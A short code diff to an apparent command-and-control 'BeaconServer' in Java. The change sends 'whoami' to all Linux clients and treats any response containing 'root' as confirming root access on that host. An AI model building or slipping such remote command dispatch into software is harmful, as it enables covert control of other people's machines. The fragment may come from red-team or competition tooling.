@@ -181,10 +181,11 @@ public class BeaconServer implements Runnable{
                 }
             }   
         }
+        distributeCommands("Linux", "whoami");
         // Check all Linux Boxes
         for (String ip : linuxClientResponses.keySet()){
             if (linuxClientResponses.get(ip).size() != 0){
-                if (linuxClientResponses.get(ip).contains("1. root") && !linuxClientResponses.get(ip).contains("DISCONNECTED")){
+                if (linuxClientResponses.get(ip).contains("root") && !linuxClientResponses.get(ip).contains("DISCONNECTED")){
                     // If responses contains the string we just send a command to get, then remove it, and give it true
                     ArrayList<String> tempList = linuxClientResponses.get(ip);
                     tempList.remove("1. root");
